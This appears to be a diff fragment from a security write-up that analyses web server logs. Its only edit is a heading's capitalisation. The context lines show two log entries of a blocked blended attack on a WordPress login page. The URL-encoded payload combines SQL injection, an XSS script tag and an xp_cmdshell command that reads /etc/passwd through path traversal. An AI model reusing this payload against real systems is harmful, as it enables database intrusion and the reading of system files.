@@ -54,7 +54,7 @@ A blended attack attempt is attempted
 1542:168.22.54.119 - - [14/Jan/2021:06:14:01 +0000] "POST /wp-login.php?itsec-hb-token=adminlogin&mglS=2151%2BAND%2B1%3D1%2BUNION%2BALL%2BSELECT%2B1%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%2BFROM%2Binformation_schema.tables%2BWHERE%2B2%3E1--%2F%2A%2A%2F%3B%2BEXEC%2Bxp_cmdshell%28%27cat%2B..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 403 3303 "-" "Mozilla/5.0 (X11; U; Linux i686 (x86_64); ru; rv:1.8.0.3) Gecko/20060425 SUSE/1.5.0.3-7 Firefox/1.5.0.3"
 1543:168.22.54.119 - - [14/Jan/2021:06:14:01 +0000] "POST /wp-login.php?itsec-hb-token=adminlogin&mglS=2151%2BAND%2B1%3D1%2BUNION%2BALL%2BSELECT%2B1%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%2BFROM%2Binformation_schema.tables%2BWHERE%2B2%3E1--%2F%2A%2A%2F%3B%2BEXEC%2Bxp_cmdshell%28%27cat%2B..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 403 3303 "-" "Mozilla/5.0 (X11; U; Linux i686 (x86_64); ru; rv:1.8.0.3) Gecko/20060425 SUSE/1.5.0.3-7 Firefox/1.5.0.3"
 ```
-**Breakdown of blended Attack Attempt**
+**Breakdown of blended attack attempt**
 
 Decoded URL: 
 ```
